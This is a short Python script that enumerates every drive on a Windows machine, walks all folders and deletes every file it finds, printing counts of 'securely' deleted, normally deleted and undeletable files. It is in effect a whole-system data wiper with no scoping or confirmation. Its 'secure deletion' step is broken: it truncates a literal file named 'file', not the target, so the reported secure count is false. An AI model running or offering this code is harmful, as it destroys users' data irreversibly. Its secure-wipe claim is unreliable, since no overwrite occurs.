import os
import scandir
import win32api

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]

for drive in drives:
        folder = drive
        file_list = []

        for paths, dirs, files in scandir.walk(folder):
                for file in files:
                        file_list.append(os.path.join(paths, file))

        print ("Found "+str(len(file_list))+" files on drive "+folder)

        securely_deleted_files = 0
        deleted_files = 0
        non_deleted_files = 0

        for file in file_list:
                try:
                        try:
                                open('file', 'w').close()
                                os.remove(file)
                                securely_deleted_files = securely_deleted_files + 1
                        except:
                                os.remove(file)
                                deleted_files = deleted_files + 1
                except:
                        non_deleted_files = non_deleted_files + 1

        print ("Deleted "+ str(securely_deleted_files)+" files securely, deleted "+str(deleted_files)+" files normally, and was unable to delete "+ str(non_deleted_files)+ " files")
